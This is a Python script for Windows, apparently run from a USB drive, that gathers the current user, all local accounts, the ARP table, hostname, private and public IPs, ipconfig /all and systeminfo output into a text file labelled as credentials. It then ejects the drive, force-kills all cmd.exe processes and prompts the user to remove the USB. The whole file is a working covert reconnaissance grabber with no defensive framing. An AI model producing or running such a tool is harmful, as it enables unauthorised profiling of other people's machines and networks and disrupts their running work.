import os
import sys
import time
from time import sleep
import subprocess
import socket
from subprocess import Popen
import threading
import ctypes
from requests import get
from datetime import timedelta


start = time.time()


hostname = socket. gethostname()
local_ip = socket. gethostbyname(hostname)
public_ip = get('https://api.ipify.org').text

print("-----------------------------------------------------")

with open("dataoutput.txt", "a") as f:

    print("-------------------------------------------------------------------------------", file=f)
    print("Windows-credentials:", file=f)
    print("Current-User:", os.getlogin(), file=f)
    print("All Users:", file=f)
    users = subprocess.check_output('cmd /c "net user"', shell=True)
    print(users, file=f)
    print("User-Capture:")
    
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.02)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)
    print("ARP Request:", file=f)
    arp = subprocess.check_output('cmd /c "arp -a"', shell=True)
    print(arp, file=f)
    print("Arp-Request:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.02)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)
    print("Hostname:", hostname, file=f)
    print("Hostname-Gathering:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.005)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)
    print("Private IP:", local_ip, file=f)
    print("Public IP:", public_ip, file=f)
    print("Private & Public IP-grabbing:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.005)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)
    print("IP-Config:", file=f)
    ipconff = subprocess.check_output('cmd /c "ipconfig /all"', shell=True)
    print(ipconff, file=f)
    print("IP-Config reading:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.02)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)
    print("Systeminfo 1:", file=f)
    sysi = subprocess.check_output('cmd /c "systeminfo"', shell=True)
    print(sysi, file=f)
    print("Reading Sysinfo 1:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.02)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)


    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []

    for item in Id:
        new.append(str(item.split("\r")[:-1]))
    for i in new:
        sysinfo = i[2:-2]


    print("Systeminfo 2: ", file=f)
    print(new, file=f)
    print("Reading Sysinfo 2:")

    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.02)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    sleep(0)

    print("\n")

    print("-------------------------------------------------------------------------------", file=f)

    os.system('powershell $driveEject = New-Object -comObject Shell.Application; $driveEject.Namespace(17).ParseName("""F:""").InvokeVerb("""Eject""")')

    elapsed = (time.time() - start)
    str(timedelta(seconds=elapsed))

    print("******************************************")
    print("Time elapsed:", elapsed)
    print("******************************************")
    
    
    #-----Spinner

class Spinner:
    busy = False
    delay = 0.5

    @staticmethod
    def spinning_cursor():
        while 1: 
            for cursor in '|/-\\': yield cursor

    def __init__(self, delay=None):
        self.spinner_generator = self.spinning_cursor()
        if delay and float(delay): self.delay = delay

    def spinner_task(self):
        while self.busy:
            sys.stdout.write(next(self.spinner_generator))
            sys.stdout.flush()
            time.sleep(self.delay)
            sys.stdout.write('\b')
            sys.stdout.flush()

    def __enter__(self):
        self.busy = True
        threading.Thread(target=self.spinner_task).start()

    def __exit__(self, exception, value, tb):
        self.busy = False
        time.sleep(self.delay)
        if exception is not None:
            return False

#-----Spinner end


with Spinner():
   time.sleep(1) 
print("Press 'Ok' and remove the USB drive")

os.system('cmd /c "taskkill /f /im cmd.exe"')

ctypes.windll.user32.MessageBoxW(0, "Press 'Ok' and remove the USB drive", "----->USB-Drive<------")